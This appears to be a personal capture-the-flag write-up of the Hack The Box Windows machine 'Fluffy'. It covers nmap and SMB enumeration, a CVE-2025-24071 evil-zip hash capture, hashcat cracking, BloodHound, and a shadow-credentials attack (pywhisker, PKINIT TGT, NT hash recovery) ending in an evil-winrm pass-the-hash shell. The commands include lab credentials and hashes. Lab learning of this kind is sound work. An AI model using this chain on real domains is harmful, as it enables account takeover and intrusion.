> s8 - window - ez -  i cannot do


> [!NOTE]  
> i have no idea what an ad is...
> we ball im going in blind
> 
> future me is gonna look at this and hopefully think 'this idiot'
> 
> but this is a self note guided by a writeup 

<details>
<summary>Nmap scan</summary>

```
# Nmap 7.95 scan initiated Fri Jul  4 05:33:07 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -O -v -oN Fluffy 10.10.11.69
Nmap scan report for 10.10.11.69
Host is up (0.27s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-05 00:33:33Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-05T00:35:06+00:00; +15h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-05T00:35:05+00:00; +15h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-05T00:35:06+00:00; +15h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-05T00:35:05+00:00; +15h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
|_SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 15h00m01s, deviation: 0s, median: 15h00m01s
| smb2-time: 
|   date: 2025-07-05T00:34:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  4 05:35:06 2025 -- 1 IP address (1 host up) scanned in 119.12 seconds
```
</details>

<details>
  <summary>Listing and connecting to SMB shares</summary>
 
smbclient -L //10.10.11.69 -U j.fleischman
```
  Password for [WORKGROUP\j.fleischman]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	IT              Disk      
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990!

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 19 10:27:02 2025
  ..                                  D        0  Mon May 19 10:27:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 1567835 blocks available
```

Downloading files from the share 
```
smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990!
Try "help" to get a list of possible commands.
smb: \> recurse ON  //recursively get files
smb: \> prompt OFF  // ignore prompt 
smb: \> mget * //get all
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (121.6 KiloBytes/sec) (average 121.6 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (838.1 KiloBytes/sec) (average 267.7 KiloBytes/sec)
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (149.9 KiloBytes/sec) (average 261.0 KiloBytes/sec)
```
</details>

Findings in share
=
Nice pdf, dont mind if i take a look 

![image](https://github.com/user-attachments/assets/e1ba2b62-022b-43ac-a719-20b07168758c)

mentioned cves in the pdf
> CVE-2025-24996

External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.
![image](https://github.com/user-attachments/assets/3667dfe0-b375-45c7-a6a1-4f0339a83faa)
![image](https://github.com/user-attachments/assets/44a1832b-18f7-43d9-9149-ef50b6717f35)

> CVE-2025-24071

Exposure of sensitive information to an unauthorized actor in Windows File Explorer allows an unauthorized attacker to perform spoofing over a network.

> CVE-2025-46785

Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access.
> CVE-2025-29968

Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.
> CVE-2025-21193

Active Directory Federation Server Spoofing Vulnerability
> CVE-2025-3445


Metasploit exploit the cve
=
time to use a module which aparently is not in metasploit

1st get the module (rb file) and put it into this folder for reasons, after that, run it to make the payload (evil zip file)
```
/usr/share/metasploit-framework/modules/auxiliary/server/
```

![image](https://github.com/user-attachments/assets/875edeef-220a-4d6c-8e0f-95d4ad006860)

and here we have the hash....
time to put the cat to work
![image](https://github.com/user-attachments/assets/59601e74-6897-442c-abf2-cde799d7b7bc)

good cat! 

```hashcat -m 5600 -a 0 agila-has.txt /usr/share/wordlists/rockyou.txt --force```
![image](https://github.com/user-attachments/assets/1a3fecce-2231-4d24-be78-ba4aef7398a4)

but too bad this user too is unprivilleged 

bloodhound 
=
Using bloodhound, we can try to get some information on thhe users in the ad?
<details>
fleischman

```
bloodhound-python -d FLUFFY.HTB -u j.fleischman -p "J0elTHEM4n1990!" -gc dc01.fluffy.htb -c all -ns 10.10.11.69

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 51S
```

agila 

```
bloodhound-python -d FLUFFY.HTB -u p.agila -p "prometheusx-303" -gc dc01.fluffy.htb -c all -ns 10.10.11.69

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 48S
```
RELEASE THE HOUND 
![image](https://github.com/user-attachments/assets/a59f7c9c-5223-4dda-98e8-2d29da1e6096)

> defenitely did not take an hour debugging postgresql, neo4j and bloodhound

but here we have it, good hound !
![image](https://github.com/user-attachments/assets/68d0e25f-0929-47bc-9695-21df4632c488)
![image](https://github.com/user-attachments/assets/8fc99465-4361-453a-b1fd-b97a765d1596)
![image](https://github.com/user-attachments/assets/ae670e0a-bc69-4ef2-acc0-974b4dfb25ae)

From this image, its knwon that agila has a service account manager role...

![image](https://github.com/user-attachments/assets/b0c5342d-540e-42aa-b834-ccc4495af5ad)

And from the servuce account manager role, we can see that we can do alot because of the GenericWrite permission. 

</details>

Attack 
=
Next we start the atatck

> give service manager role to agila and make fake cert
![image](https://github.com/user-attachments/assets/2c6d7619-ef2a-4ca1-baf7-9bf33a76a7bf)

> oh, kerberos is very dependent on time, im calling dio (this part didnt really work out) 
> ![image](https://github.com/user-attachments/assets/4addd188-9a23-4342-9fed-fd8a7be68cd8)
> ![image](https://github.com/user-attachments/assets/e2c85061-4c56-4765-8ec1-16b20d250ff5)


> after spending way too much time (pun) changing the system time to match their system time, it was make known that GUI through system settings was the only way
> ![image](https://github.com/user-attachments/assets/887affa9-8395-4e85-935a-061cc7fd3301)

> as the repo stated, its magic really, it was
> ![image](https://github.com/user-attachments/assets/e3db27de-6920-47f6-867f-8601bc42d3f9)

> now time to get a shell and it will be smooth sailing from there 
> ![image](https://github.com/user-attachments/assets/264a9d81-af80-4e84-806a-4bb1d1b78fea)

> [!NOTE]
> This is all for me to refer back incase i forget (which i am very forgetful)
> mostly ai gen as i dont know much aabout windows ad **aS A lINux uSEr**

The exploit here is using shadow crdential and exploit the ```msDS-KeyCredentialLink``` in AD. It allows users authenticate with a certificate instead of a password. 
This attack requires at least a user access and GenericWrite or GenericAll over target user (in this case agila) or WriteProperty specifically on msDS-KeyCredentialLink. Thse usually comes from compromosed service account or misconfigured privilleges. 

The attack starts with generating a new RSA key pair and certificate with pywisker. It also writes the cert and keypair to the target user's msDS-KeyCredentialLink
```
./pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
```
in the ad, this happens
```
# This is essentially what pywhisker does via LDAP
Set-ADUser -Identity "winrm_svc" -Add @{'msDS-KeyCredentialLink'=$certificateData}
# by claude
```

Next Up is the TGT REquest from gettgtpkinit (get tgt pk init?)
A TGT (ticket granting ticket), a weird ass Microsoft term =) is an encrypted ticket issued by the Authentication Server (AS). It is used to access network rescources.

By using the private key generated from pywhisker, it sends AS-REQ (Authentication Server Request) with PKINIT (Public Key Cryptography for Initial Authentication)
On the server side, the domain controller validates the certificate against msDS-KeyCredentialLink and issues a TGT and  session key if valid 
```
python3 gettgtpkinit.py -cert-pem V0shaM75_cert.pem -key-pem V0shaM75_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
```

Now that we have an AES ket from the TGT Request from before to request the victim user (in this case winrm) NT hash through the U2U (User-to-User) authentication process.
NT hash is the windows format of storing and hashing password which allows evil-winrm to usse it for authentication 
```
python3 getnthash.py -key "c8544f389cecfe58224d6728259683b5d845ca591cad93f892427e123a5e0850" fluffy.htb/winrm_svc
```

Then finally the attacker can get a shell by using evil-winrm and the NT hash from previous step. 
```
evil-winrm -i 10.10.11.69 -u winrm_svc -H "33bd09dcd697600edf6b3a7af4875767"
```
